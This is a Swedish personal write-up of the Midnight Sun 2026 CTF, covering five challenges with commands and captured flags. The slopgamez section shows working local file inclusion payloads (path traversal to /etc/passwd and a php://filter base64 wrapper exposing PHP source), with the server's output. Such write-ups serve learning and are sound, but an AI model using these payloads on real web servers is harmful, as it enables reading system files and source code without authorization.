# Midnight Sun 2026

Söndag 10/05/2026 - 15:00

Tyvärr blev den här utmaningen flyttad ett flertal gånger vilket gjorde att jag hade begränsat med tid att sitta med utmaningarna.

## Chall 1 - s4n1ty

echo 'K0nbxQzZ08FMn91M391MyNDafdjKoN3X3dHN7RHanlmbklWb'|rev|base64 -d

midnight{4ww_sh*7_h3r3_w3_g0_4g41n}

## Chall 1 - slopgamez

http://slopgamez.play.ctf.se:13337/

"The hacking scene can be a mysterious web of lies and deceit. Find the ground truth."


        <head>
            <title>Wargaming Scene Phile</title>
            <style>
                127.0.0.1	localhost
    ::1	localhost ip6-localhost ip6-loopback
    fe00::	ip6-localnet
    ff00::	ip6-mcastprefix
    ff02::1	ip6-allnodes
    ff02::2	ip6-allrouters
    172.19.0.2	0e97837c58fe
            </style>
        </head>

Lite olika prov. view-source:http://slopgamez.play.ctf.se:13337/index.php?theme=../../../etc/passwd

        <head>
            <title>Wargaming Scene Phile</title>
            <style>
                root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
    _apt:x:42:65534::/nonexistent:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
            </style>
        </head>


http://slopgamez.play.ctf.se:13337/index.php?theme=../../../var/www/html/index.php

URL:en här ovanför gick inte nå. Den laddar och sen funkar det inte, fick ett felmeddelande om att den laddar för evigt osv.

http://slopgamez.play.ctf.se:13337/index.php?theme=php://filter/read=convert.base64-encode/resource=/var/www/html/index.php

Nytt koncept för mig. Med hjälp av "php://filter" så kan jag manipulera en fil innan den laddar, gjorde om den till b64 och dekodade den och fick fram följande:

base64 -d b64.txt

    <?php

        // FLAG: midnight{w4ch00_t4lk1ng_4b0ut_w1ll1s}

        if (empty($_REQUEST['theme'])){
            header('Location: index.php?theme=themes/dark');
            exit(0);
        }
    ?     

## Chall 3 riscal

Denna var ganska enkel måste jag säga.

    wget http://get.ctf.se/riscal.tar.gz
    gunzip riscal.tar.gz
    tar -xvf riscal.tar
    strings riscal-0f56f1aacbef526420953111a1d07d10

midnight{RISCV_1S_4_34zy_1S4_70_unDeRst4Nd!!}

## Chall 4 tunnel

Trodde jag skulle dechiffrera en massa binärt, så jag satt med papper och penna och skrev ner en lång sträng:

1111 1101 1001 0101 1110 0101 1010 0001 0101 0101 0110 0111 1000 0111 0010 0011 0001 0010 0001 1100 0001 0110 1101 1001 0010 1111 0110 0110 0001 0011 0001 1101 1011 1110 0111 0111 0001 1

Men sen kom jag bara till slutet och då gav de mig flaggan. Skrev ned allt för ingenting.

flag: midnight{sh0uLD_h4v3_s3T_rob07s.txt}


## Chall 5 smachine

Den här löste jag manuellt, startade och kollade help på olika saker för att försöka begripa vad som hände, testade mig fram vilka värden som behövde matas in för att hitta rätt och sen en xor på det löste problemet. Lösningen såg ut såhär till slut:

    ┌──(kali㉿kali)-[~/midnight_2026]
    └─$ nc smachine.play.ctf.se 9189

    ▄▄█████████ ▄███▄  ▄▄███ ▄▄████████▄ ▄▄████████▄
    ████▀▀▀▀▀▀▀ ██████▄██████ ████▀▀▀████ ████▀▀▀████
    ████▄▄▄▄▄▄  ████▀███▀████ ████▄▄▄████ ████   ▀▀▀▀
    ▀▀▀▀▀▀▀████ ████ ▀▀▀ ████ ████▀▀▀████ ████   ▄▄▄▄
    ▄▄▄▄▄▄▄████ ████     ████ ████   ████ ████▄▄▄████
    ██████████▀ ████     ████ ████   ████ ▀█████████▀
    ▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀     ▀▀▀▀ ▀▀▀▀   ▀▀▀▀  ▀▀▀▀▀▀▀▀▀

    ▄███   ▄███ ▄█████████ ▄███   ▄███ ▄▄█████████
    ████   ████ ▀▀▀████▀▀▀ █████▄ ████ ████▀▀▀▀▀▀▀
    ████▄▄▄████    ████    ███████████ ████▄▄▄
    ████▀▀▀████    ████    ████▀▀█████ ████▀▀▀
    ████   ████ ▄▄▄████▄▄▄ ████  ▀████ ████▄▄▄▄▄▄▄
    ████   ████ ██████████ ████   ████ ▀██████████
    ▀▀▀▀   ▀▀▀▀ ▀▀▀▀▀▀▀▀▀▀ ▀▀▀▀   ▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀
    Welcome to the Simple Machine. Type help or ? to list operations.


    #> add x0 4918
    #> xor x0 1
    #> regs
    x0 = 0x1337
    x1 = 0x0000
    x2 = 0x0000
    x3 = 0x0000
    x4 = 0x0000
    x5 = 0x0000
    x6 = 0x0000
    x7 = 0x0000
    x8 = 0x0000
    x9 = 0x0000
    #> win
    You Win, Flag is midnight{s1MpL3_sT4cK_M4cH1N3}


Hann som sagt inte spela så hemskt mycket. Här är slutpositionen bl.a.

![Slutpoäng](<Skärmbild 2026-05-11 214737.png>)